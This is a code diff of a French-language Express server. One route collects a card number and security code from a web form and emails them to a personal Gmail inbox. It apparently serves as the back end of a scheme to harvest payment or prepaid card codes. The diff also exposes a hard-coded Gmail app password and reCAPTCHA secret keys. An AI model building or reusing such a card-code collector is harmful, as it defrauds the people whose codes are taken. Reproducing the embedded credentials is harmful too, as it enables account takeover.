@@ -7,9 +7,11 @@ const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Routes
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -26,14 +28,15 @@ app.post('/envoyer-code', async (req, res) => {
     return res.status(400).send("Montant invalide");
   }
 
-  // Vérification CAPTCHA
+  // Vérification Captcha
   if (!captcha) {
     return res.status(400).send("Veuillez valider le Captcha.");
   }
 
+  const secretKey = "6Lc49BkrAAAAAED5fyYu7EA57NFm3kcOM9KjZkTt";
+
   try {
-     // const secretKey = "6Ld23h8rAAAAALUmYCTLrghIZ8s47qdO8wGmQEcg";
-     const secretKey = "TO_BE_REPLACED";
+    const response = await axios.post(
       `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${captcha}`
     );
 
@@ -41,12 +44,12 @@ app.post('/envoyer-code', async (req, res) => {
       return res.status(400).send("Échec de la vérification Captcha.");
     }
 
-    // Envoi du mail
+    // Configuration de l’envoi d’email
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
         user: 'wanarnaud@gmail.com',
-        pass: 'gyauzfvkgauczwhj',
+        pass: 'gyauzfvkgauczwhj'
       }
     });
 
@@ -54,17 +57,18 @@ app.post('/envoyer-code', async (req, res) => {
       from: 'wanarnaud@gmail.com',
       to: 'wanarnaud@gmail.com',
       subject: 'Code de carte reçu',
-      text: `Code: ${numeroCarte}\nMontant: ${codeSecurite}`
+      text: `Code : ${numeroCarte}\nMontant : ${codeSecurite}`
     };
 
     await transporter.sendMail(mailOptions);
     res.send("Code envoyé avec succès !");
   } catch (error) {
-    console.error("Erreur d'envoi:", error);
+    console.error("Erreur d'envoi :", error);
     res.status(500).send("Une erreur est survenue.");
   }
 });
 
+// Lancer le serveur
 app.listen(PORT, () => {
   console.log(`Serveur lancé sur http://localhost:${PORT}`);
 });
